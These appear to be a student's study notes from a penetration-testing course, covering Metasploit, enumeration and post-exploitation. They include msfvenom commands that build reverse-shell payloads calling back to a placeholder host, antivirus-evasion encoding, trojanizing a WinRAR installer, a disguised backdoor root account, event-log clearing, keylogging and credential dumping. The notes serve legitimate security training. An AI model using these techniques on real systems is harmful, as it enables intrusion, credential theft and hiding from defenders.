  - arpspoof -i eth1 -t x.x.x.x -r x.x.x.x (t = victim ip; r = router) (basically in the lab, we are targeting the victim server (t) and the client was the router)
  - Look at Wireshark and check if we can see some traffic
  
  
  ## WiFi Security and Traffic analysis
  
  

# Host & Network Penetration Testing: The Metasploit Framework
  
  ## Metasploit Framework Overview
  
  ### Introduction
  Metasploit Framework is a penetration testing Framework that provides pentesters with a large database of public tested exploits and a robust infrastructure to automate every stage of the pentest lifecycle. The MSF is designed to be modular, allowing for new functionality to be implemented with ease.
  - Metasploit Pro (Commercial)
  - Metasploit Express (Commercial)
  - Metasploit Framework (Community, Open-Source)
  
  
  ### Metasploit Framework Architecture
  ![image](https://user-images.githubusercontent.com/58482416/210554276-eac68f56-f91f-434b-a60a-7ec3ec6b4f1d.png)
  - Exploit: A module that is used to take advantege of vulnerability and is typically paired with a payload
  - Payload: Code that is delivered by MSF and remotly executed on the target after successfull exploitation. An exampke of a payload is a reverse shell that initiates a connection from the target system back to the attacker.
  - Encoder: Used to encode payloads in order to avoid AV detection. For example, shikata_ga_nai is used to encode windows payloads
  - NOPS: Used to ensure that payloads sizes are consistent and ensure the stability of a payload when executed.
  - Auxiliary: A module that is used to perform additional functionality like port scanning and enumeration.

  When working with payloads, MSF provides you with two types of payloads that can be paired with an exploit:
  
  - Non-Staged Payload - Payload that is sent to thae target system as is along with the exploit
  - Staged Payload - A staged payload is sent to the target in two parts, wehreby:
    - The first part (stager) contains a payload that is used to establish a reverse connection back to the attacker, download the second part of the payload (stage) and execute it.
  
  Meterpreter Payload is an advanced multi-functional payload that is executed in memory on the target system making it difficult to detect. It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system.
  
  
  
  ### MSFconsole Fundamentals
  - Defacto standard for interacting with MSF (ease-of-use all in one interface)
  - What we need to know:
    - How to search for modules?
    - How to select modules?
    - Hot wo configure module options & values
    - How to search for payloads
    - Managing sessions
    - Additional functionality
    - Saving your configuration
  
  - MSF Module Variables
    - They allow us to set typically required information such as an IP Address or a Port.
    - MSF supports Global and Local Variables
    - Typically userd variables
      - LHOST (local Host / Attacker system)
      - LPORT (local Port / attackers port)
      - RHOST and RHOSTS (one or multiple target IPs)
      - RPORT (Target Systems Port)
  
  - "SEARCH" Command to search for exploits, modules and anything else
  - "USE" to use a module
  - "show options" -> show options of a module
  - "set" RHOSTS -> set a Value of the RHOSTS variable / option
  - use "crtl + c" to stop a module
  - "back" to get out of a module
  - "run" or "exploit" to start the attack
  
  - search cve:2017 type:exploit platform:-windows (specific search with filters)
  
  ### Creating and Managing Workspaces
  - Check db connection with "db_status"
  - Check the Help menu with "workspace -h"
  - Type "workspace" to check which workspace you are using
  - Create a new Workspace "workspace -a WORKSPACE NAME"
  - Switch workspace with "workspace WORKSPACE NAME"
  - Delete a workspace "workspace -d WORKSPACE NAME"
  - Rename a workspace "workspace -r WORKSPACE NEW NAME"
  
  
  ## NMAP
  ### Port Scanning and Enumeration with NMAP
  - We can output the results of our Nmap scan in to a format that can be imported into MSF for vulnerability detection and exploitation
    - use the -oX (XML) Option.
    
  - Import NMAP Scan Results into MSF
    - Create a new Workspace e.g. workspace -a NAME
    - Import: db_import /root/nmap_result_output
    - Check e.g. via the "hosts" or "services" command in MSF
    
  - Run an NMAP Scan within MSF
    - db_nmap -sV .O x.x.x.x (or something else) and the results will be automatically saved in MSF DB / the Workspace
  
  
  ## Enumeration (MSF)
  ### Port Scanning with Auxiliary Modules
  
  - Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing
  - We can use auxiliary modules to perform both UDP and TCP Port Scanning as well as enumerating information from services like FTP,SSH and HTTP etc.
  - Auxiliary Modules can be used during the information gathering phase of a penetration test as well as the post exploitation phase.
  - Auxiliary Modules have nothing to do with exploitation, so they have NO PAYLOADS!
  
  - To perform attacks or enumeration via a jumphost you can use the autoroute command
    - in a meterpreter session run "run autoroute -s TARGET IP"
    
    
  ### FTP Enumeration with MSF
  - We can use multiple auxiliary modules to perform Brute-Force attacks because FTP handles authentication with a username and passwort (or anonymous!)
  - search :type auxiliary name:ftp (below are some useful modules)
    - ftp_version (Version scanner)
    - ftp_login (Brute force)
    - ftp/anonymous
    
  ### SMB Enumeration with MSF
    - smb_version
    - smb_enumusers (Enumerate SMB Users)
    - smb_enumshares (set SHOWFILES true)
    - smb_login (Bruteforce / Dictionary attack)
    
  ### Web Server Enumeration
  - search type:auxiliary name:http
    - http_version (http Version detection)
    - http_header (Header Scan which can be helpful if misconfigured)
    - robots_txt (show the robots.txt contents)
    - use curl to pull down websites within a shell
    - dir_scanner (directory bruteforcing / scanner)
    - files_dir (interesting file scanner)
    - http_login (Bruteforce on http login form)
    - apache_userdir_enum (try to enumerate User accounts)
    - http_put
    - dir_listing
  
  
  ### MySQL Enumeration
  - MySQL utilizes TCP port 3306 by default
  - search type:auxiliary name:mysql
    - mysql_version
    - mysql_login
    - mysqk_enum (simple enumeration with username and password specified)
    - mysql_sql (interacting with sql)
    - mysql_schemadump
    - mysql_hashdump
    - mysql_writable_dirs
  
  ### SSH Enumeration
  - search type:auxiliary name:ssh
    - ssh_version
    - ssh_login
    - ssh_enumusers
  
  ### SMTP Enumeration
  - SMTP uses TCP 25 by default and can also be configured to run on port 465 and 587
  - seach type:auxiliary name:smtp
    - smtp_version
    - smtp_enum
    
  ## Vulnerablility Scanning with MSF
  - We are looking for Metasploit Exploit modules to find vulnerabilities or misconfigurations on a system.
  - Nessus scans can be integrated in MSF
  
  - start a service scan with db_nmap -sS -sV -O x.x.x.x/xx
  - All results will be added to the nmap database
  - type "hosts" or "services" to see the results
  - with the results of the "services", you can type "search type:exploit name:<<SERVICE VERSION>>
  - we can also use searchsploit which brings up exploits available at exploit-dn. You can limit the results to only show msf exploits
  - github "metasploit-autopwn" repo searches the msf db (Download and move it to the plugins directory and in msf type "load db_autopwn")
  
  ## Vulnerability Scanning with Nessus and MSF
  - Nessus automates the process of identifying vulnerabilities and also provides us with further information such as the corresponding cve code
  - We used nessus essentials (limited to 16 ip's)
  - Skipped this course (i'll try that myself..)
  
  
  ## Vulnerability Scanning with WMAP
  - load wmap
  - Add a site (ip) with wmap_sites -a x.x.x.x
  - Add a target url with wmap_targets -t http://x.x.x.x
  - wmap_run -t (this shows all available msf modules)
  - wmap_run -e (perform the vulnerability check)
  
  ## PAYLOADS
  ### Generating payloads with msfvenom
  - A client-side attack is an attack vector that involves coercing a client to execute a malicious payload on their system that consequently connects back to the attacker when executed
  - Client-side attacks typically utilize various social engineering techniques like generationg malicious documents or portable executables (PEs)
  - Given this vector involves transferring a malicious payload to the client, we need to be aware of AV detection!
  -  we will use msfvenom as a payload generator! we will focus on a meterpreter payload...
  
  - when specifying a payload with msfvenom, we usually start with the operating system, the architecture and then the protocol to connect back
  - staged payload uses "/" between meterpreter and protocol, "_" between meterpreter and protocol is a non-staged payload!
  - e.g. windows/x64/meterpreter/reverse_tcp is a staged payload
  - e.g. windows/x64/meterpreter_reverse_tcp is a non-staged payload
  
  - to generate a payload with msfvenm, you usually have to specify this:
    - msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f exe > /home/felix/Desktop/payloadx86.exe
    - this generates a payload for a 32-bit windows machine with the output format exe that connects back to x.x.x.x on port 1234
    
  - before you run this payload, set up the msf multi/handler module!! AND SET THE RIGHT PAYLOAD TYPE!
  
  ### Encoding Payloads with msfvenom
  - encoding helps to avoid signature av detection!
  - x86/shikata_ga_nai encoder for windows and linux executables is excellent! (this will work on 64 and 32 bit!)
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/felix/encoded.exe
  - you can do more iterations of encoding by specifying "-i 10" (after LPORT) 
  
  ### Injecting Payloads into windows portable executables
  
  - we can utilize the msfvenom -x option to inject it into an legitimate portable executable (e.g. winrar) (use the -k option also to maintain the functionality!
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /home/felix/downlaods/winrar602.exe > /home/felix/winrar_injected.exe
  
  
  ## Automating Metasploit with Resource Scriopts
  - Metasploit resource scripts are a great feature of MSF that allow you to automate repetitive tasks and commands
  - quite similar to batch scripts where you can specify a set of msfconsole commands that you want to execute sequentially
  - skipped this.. read a manual to create resource scripts. :)
  
  
  ## Exploitation (Windows) (MSF)
  ### Exploiting a vulnerable http file server
  - HTTP File Server (HFS) is a web server that is designed for file & document sharing
  - Rejetto HFS is a popular HTTP File Server and Rejetto HFS V2.3 is vulnerable to a remote command execution attack!
  - search for "rejetto"
  
  ### Exploiting MS17-00 SMB Vulnerability (Ethernal Blue)
  - was used in the WannaCry Ransomware Attack!
  - Affects multiple Windows Versions from Windows Vista to 10
  - The Vulnerability exists in SMBv1
  
  ### Exploiting Apache Tomcat
  - Tomcat is a popular and open source Java servlet web server
  - Apache Tomcat Webserver is primarily used to host dynamic websites or web applications developed in java
  - Apache Tomcat V8.5.19 or below is vulnerable to a remote code execution
      - TRY THIS: exploit/multi/http/tomcat_jsp_upload_bypass
  
  ## Linux Exploitation
  
  ### Exploiting a vulnerable FTP Server
  - vsftpd is a FTP server for Unix-Like systems and is the default FTP server for Ubuntu, CentOS and Fedora
  - vsftpd V2.3.4 is vulnerable to a command execution vulnerability
  
  ### Exploiting Samba
  - Samba is the Linux implementation of SMB and allows Windows systems to access Linux shares and devices.
  - Samba V3.5.0 is vulnerable to a remote code execution vulnerability, allowing a malicious client to upload a shared libary to a writeable share, and then cause the server to load and execute it.
  
  ### Exploiting a vulnerable ssh server
  - libssh V0.6.0 - 0.8.0 is vulnerable to an authentication bypass
  - search for libssh
  - show the options and set the spawn_pty to true to spawn an interactive session
  
  ### Exploiting a vulnerable smtp server
  - smtp server haraka (plugin) prior to V2.8.9 is vulnerable to a command injection.
  - set the payload to linux/x64/meterpreter_reverse_http
  - fill out the other necessary options and exploit it.
  
  
  ## Post Exploitation Fundamentals (Meterpreter)
  
  ### Meterpreter Fundamentals
  - The Meterpreter (Meta-Interpreter) payload is an advanced multi-functional payload that operates via DLL injection and is executed in memory on the target system, consequently making it difficult to detect
  - It communicates over a stager socket and provides an attacker with an interactive command interpreter on the target system that facilitates the execution of system commands, file system navigation, keylogging and much more
  - Meterpreter also allows us to load custom script and plugins dynamically
  - MSF provides us with various types of meterpreter payloads that can be used based on the target environment and the OS architecture.
  - Useful Meterpreter commands:
    - sysinfo
    - getuid -> current permissions
    - help (show up the help menu)
    
    - Windows Meterpeter has some more advanced features such as keylogging and credential dumping
  
  - exit a meterpreter session: exit
  - background a session: background (or strg + z)
  - sessions (show active sessions)
  - sessions -h -> get help
  - search for files: search -d /usr/bin -f *backdoor*    or    search -f *.jpg
  
  
  
  ### Upgrading Command Shells to meterpreter shells
  - background the open shell session
  - use post/multi/manage/shell_to_meterpreter
    - fill options (SESSION) and run!
  - or you can use sessions -u <nb> to upgrade a command shell to meterpreter automatically
  
  
  ## Windows Post Exploitation Modules
  
  - MSF provides us with various post exploitation modules to:
    - Enumerate user privs
    - Enumerate logged on users
    - VM Check
    - Enumerate installed programs
    - Enumerate AVs
    - Enumerate computers connected to a domain
    - Enumerate installed patches
    - Enumerate shares
    
  - getuid -> show user
  - getsystem -> try elevate to system privs
  - migrate <PID> -> migrate meterpreter to another process
    - we can also use post/windows/manage/migrate
  - search checkvm -> check if target is a vm
  - search enum_applications -> enumerate all installed applications
  - search type:post platform:windows enum_av -> Check which av is installed and if some folders are excluded
  - search enum_computers -> enumerate computers in a domain
  - search enum_patches -> IMPORTANT! -> Enumerate Patches 
  
  
  ### Bypassing UAC
  - UAC is a Windows Security Feature introduced with Windows Vista.
  - UAC is used to ensure that changes to the os require approval from the administrator
  - We can utilize "Windows Escalate UAC Protection Bypass (In Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.
  
  - meterpreter shell is required! (x64 bit Version required!)
  - use exploit/windows/local/bypassuac_injection -> can be used to bypass uac
    - set the payload to windows/x64/meterpreter/reverse_tcp
    - show options and fill out (maybe we need to adjust the target to x64 (type set TARGET <tab> to autocomplete))
  
  
  
  ### COMMON ERRORMESSAGE IN PAYLOADS: Exploit failed: RuntimeError The EXE generator now has a max size of 4096 bytes, please fix the calling module
  THIS MEANS THAT THE PAYLOAD IS TO BIG (STAGELESS), USE A STAGED PAYLOAD!
  
  
  
  ### Windows Privilege Escalation: Token Impersonation with Incognito
  ![grafik](https://user-images.githubusercontent.com/58482416/215333885-c4690f25-a67e-4774-b740-bdcb1c936891.png)

  - The following priveleges are required for a successfull impersonaltion attack
    - SeAssignPrimaryToken: This allows a user to impersonate tokens
    - SeCreateToken: This allows a user to create an arbitary token with administrative privileges
    - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges (DAS BRAUCHEN WIR AUF JEDEN FALL!)
  - Incognito is a built-in meterpreter module that was originally standalone that allow you to impersonate tokens after successful exploitation
  
  
  ### Dumping hashes with mimikatz
  - The SAM (Security Account Manager) database, is a database file on windows systems that stores users passwords and can be used to authenticate users both locally and remotely.
  - We can utilize pre-built mimikatz executable, alternatively, if we have a ccess to a meterpreter session on a windows target, we can use the inbuilt meterpreter extension called "Kiwi"
  - Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk. (Im Memory)
  
  
  ### Pass-the-Hash with PSExec
  - capturing or harvesting NTLM hashes or cleartext passwords to authenticate with the target
  - dump the hashes via a meterpreter session
  - use the "exploit/windows/smb/psexec" and specify SMBUSER with the Username and SMBPASS with the NTLM Hash (or a valid password) to get a shell.
  
  
  
  ### Establishing persistence on windows
  - search for: platform:windows persistence -> you will find a lot of mudules.
  - a good choice is persistence_service
  
  
  
  ### Enabling RDP on a windows target
  - RDP is disabled by default
  - we can use a msf module to enable it
  - RDP authentication need a legitmate username and password (clear text!)
  - post/windows/manage/enable_rdp is the module name
  - use xfreerdp /u:administrator /p:<<password>> /v:<<ip>> to connect from a linux client.
  
  ### Windows Keylogging
  -  works best when migrated to the explorer.exe process!
  - start the keylogger directly from meterpreter -> keyscan_start, keyscan_stop, keyscan_dump
  
  ### Clearing Windows Event Logs
  - from a meterpreter session run "clearev" to completely erase all events
  
  ### Pivoting with meterpreter
  - using a compromised host to exploit other host on the internal network
  - from a meterpreter session, you can run:
    - "run autoroute -s x.x.x.x/xx" to add a route to another subnet that is connected to the compromised host
  - from there we can interact with this subnet over the compromised host.
  - we'll need to setup portforwarding on the first victim, because we need to interact with victim 2 over victim 1. 
    - in meterpreter: portfwd add -l 1234 -p <rem. port> -r <victim2>
    - db_nmap -sV -sC -p 1234 localhost
  
  - to exploit another machine we'll need the bind_tcp meterpreter payload (NOT reverse_tcp)!!!
  
  
  ## Linux Post Exploitation
  
  ### Linux Post Exploitation Modules
  
  - used module: is_known_pipename (samba exploit) (This module exploits Samba from versions 3.5.0-4.4.14, 4.5.10, and 4.6.4 by loading a malicious shared library.)
  - used commands to explore the system:
    - sysinfo
    - getuid (if uid=0 -> root)
    - type "shell" and type /bin/bash -i to spawn a bash shell
    - cat /etc/*issue -> enumerate Linux Version
    - uname -r -> kernel version
  - Use post exploit modules
    - search enum_configs (get all config files)
    - post/multi/gather/env Linux & Kernel Version
    - enum_network -> collect all network information
    - get your enumerated data with the "loot" command
    - enum_protections -> Check security systems used.
      - stored in "notes" (type "notes")
    - enum_system -> gather system and user information
    - checkcontainer -> Check if we're in a container (e.g. docker)
    - checkvm - Check if this is a VM
    - enum_users_history -> gather the user history (bash history file)
    
    
  ### Linux Privilege Escalation: Exploiting a vulnerable program
    - get a session and upgrade it with sessions -u x
    - i've check the enum_protections module and find out there was a software called "CHKROOTKIT" that is vulnerable to a priv esc. vulnerability
  
  
  ### Dumping hashes with hashdump
  - Linux User Account hashes are stored in /etc/shadow.
  - We need to have root privs to read or this file to do further cracking (with John the Ripper)
  - obtain a meterpreter session (in this case: is_known_pipename (samba)
  following commands were used:
    - post/multi/gather/ssh_creds
    - post/multi/gather/docker_creds
    - post/linux/gather/hashdump
    - post/linux/gather/ecryptfs_creds
    - post/linux/gather/enum_psk
    - post/linux/gather/enum_xchat
    - post/linux/gather/phpmyadmin_credsteal
    - post/linux/gather/pptpd_chap_secrets
    - post/linux/manage/sshkey_persistence
  
  
  ### Establish persistence on Linux
  - add a user for backdoor access with a service name
    - useradd -m ftp -s /bin/bash
    - passwird ftp
    - add to root group: usermod -aG root ftp
    - usermod -u 15 ftp (used to modify the userid, that it looks that the user has not been added a few minutes ago.)
  
  - search platform:linux persistence (we've testet the apt_package_manager_persistence and cron_persistence, but there are a few others)
  - be aware, that a cronjob persistence mechanism can easily be detected by sysadmins!!!
  - sshkey_persistence is a good way to establish persistence (difficult to detect)
  
  
  ## Armitage
  - GUI Interface with all msfconsole controls
  - No further notes.
  
  
  
  # Host & Network Penetration Testing: Exploitation
  - Penetration Testing Execution Standard: is a pentesting methodology that was developed by a team of infosec practitioners with the aim of addressing the need for a comprehensive and up-to-date standard for pentesting
  - http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
  
  ![grafik](https://user-images.githubusercontent.com/58482416/218301321-273a4726-5424-4b84-85c5-7751316511ef.png)
  
  ## Vulnerability Scanning
  ### Banner Grabbing
  - Identifing Services and we need to find out the Service Version to check if an application is vulnerable
  - Banner Grabbing is an information gathering technique 
  - Banner GRabbing can be performed with:
    - Performing a service version detection scan with NMAP (e.g.: nmap -sV -O x.x.x.x)
      - grab a banner with --script=banner (should be the same with the service version detection, but can be used if -sV fails)
    - Connecting to the Port with Netcat (nc)
      - nc x.x.x.x port (e.g. nc 192.168.1.2 22)
    - Authenticationg with the service (if the service supports authentication), for example SSH, FTP, Telnet etc.
      - ssh test@x.x.x.x (you dont need valid credentials, sometimes you get the version)
  
  ### Vulnerability Scanning with nmap scripts
  - nmap scripts are normally stored in: /usr/share/namp/scripts
  - use grep to limit the results to a protocol, e.g. ls /usr/share/nmap/scripts/ | grep http
  - specify a script by: nmap -sV --script=http-enum x.x.x.x -p 80
  - get a list of vulnerability detection scripts: ls /usr/share/nmap/scripts/ | grep vuln
  
  ### Vulnerability Scanning with Metasploit
  - normally perform an nmap scan (with Version detection option enabled (sV) and then use the "search" command to find some auxiliary modules to perform some futher scanning. If you find a vulnerability, search for corresponding exploits.
  
  
  ## Searching for Exploits
  
  ### Searching for publicy available exploits
    - Exploit code can be found online, but it is crucial to check the source code when downloading and running exploits from unknown sources!!
    - trusted sources are:
      - exploit-db https://www.exploit-db.com/ (Check "verified" to only show veryfied exploit code)
      - rapid7 https://www.rapid7.com/db/ (all exploits found here are included in metasploit) (search is not very good on this page)
  
    - use google dorks
      - vsfpd 2.3.4 site:exploit-db.com
      - ...
  - PacketStormSecurity https://packetstormsecurity.com/ is also a good source.
    - Find exploits
    - get Vulnerability notes
    - TOOLS
  
  ### Searching for exploits with SearchSploit
  - If you dont have access to online databases, you can use searchsploit
  - Kali comes (pre-Packaged) with all exploit-db exploits offline!
  - SearchSploit is used to search through all exploits
  - the package is called "exploitdb" (apt-get install exploitdb)
  - default path: /usr/share/exploitdb
  - usage: searchsploit <search string>
  - use searchsploit -m <exploit number> to copy the exploit to the current working directory
  - search terms:
    - c (case sensetive)
    - t (title search; search only through the title)
    - e (exact search; exactly what you've specified); e.g. searchsploit -e "OpenSSH 7.2"
    - w (display the exploit-db URL instead of the EDBID)
  - filters:
    - searchsploit remote windows smb (search for all remote exploits, with windows as a platform that target SMB)
  
  
  ## Cross-Compiling Exploits
  - In some cases, exploit code will be developed in C / C++ or C#, as a result, you will need to compile the exploit code into a PE (Portable Executable) or binary.
  - As a Pentester, you must be able to compile exploit code developed in C.
  
  - To compile windows c exploits on linux, we need some tools:
    - MinGW-w64 (install it by: sudo apt-get install mingw-w64)
    - GNU C compiler (sudo apt-get install gcc)
  - For Windows:
    - i686-w64-mingw32-gcc 9303.c -o exploit (This compiles an exploit written in c for windows (64-bit)
    - i686-w64-mingw32-gcc 9303.c -o exploit -lws2_32 (compile a 32 bit executable)
  - For linux:
    - read the compile instructions from the exploit or use gcc.
  
  ## Bind and Reverse Shells
  ### Netcat fundamentals
  - Netcat is a networking utility used to read and write data to network connections using TCP or UDP.
  - Is available for UNIX and Windows OS
  - Is used to:
    - Banner Grabbing
    - Port Scanning
    - Transferring Files
    - Bind / Reverse Shells
  - Use "nc --help" or "man nc" to get a brief introduction to netcat
    - "-l" listen option
    - "-n" nodns (do not resolve hostnames)
    - "-v" verbose level
    
  
  - Port Scanning / Connect to Ports / Banner Grabbing:
    - nc -nv x.x.x.x xx (TCP)
    - nc -nvu x.x.x.x xx (UDP)
  
  
  - Start a listener
    - nc -nlvp 4444 (opens up a port on tcp 4444 on the localhost)
    - nc -nlvup 4444 (opens up a port on udp 4444 on the localhost)
    
  - Download a file
    - On the target (Windows): "nc.exe -nlvp 1234 [smaller sign] test.txt"
    - On the attacker side (Linux): "nc -nv x.x.x.x 1234 [greater sign] test.txt
  
  ### Bind Shells
  
  - ![grafik](https://user-images.githubusercontent.com/58482416/219943101-c4c9226f-cb23-4cc0-a9d0-352485488d90.png)
  - Why are reverse shells better in general?
    - First, we need to setup a netcat listener on the target (how do we do that when we dont have access to the system?)
    - Second, it's INBOUND traffic (from the target perspective)!! It will likely be blocked by the firewall of the target system.
  - With a reverse shell, the roles are switched! 
  - To build a bind shell, just use the commands mentioned above
  
  ### Reverse Shell
  - It is the opposite of bind shells and the roles are switched.
  - ![grafik](https://user-images.githubusercontent.com/58482416/219943785-cfd399e0-4699-4804-b080-0cf5ee0b35d4.png)

  ### Reverse Shell Cheatsheets
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
  - www.revshells.com
  
  ## Exploitation Frameworks
  ### The metasploit framework
  (Nothing new)
  
  ### PowerShell Empire
  - is a pure PowerShell exploitation/post-exploitation framework
  - it allows to run PowerShell agents without needing powershell.exe
  - it has modules from keyloggers, detection evasion, priv esc. to hashdumping...
  - Maintaned by Kali Linux
  - PowerShell-Empire is primarily designed for windows targets and specialized on exploitation / post-exploitation
  - Can alsom be seen as a C2 Server for Windows targets.
  - Starkiller is a GUI Frontend for PowerShell Empire
  
  
  
  
  
  
                                                               
   
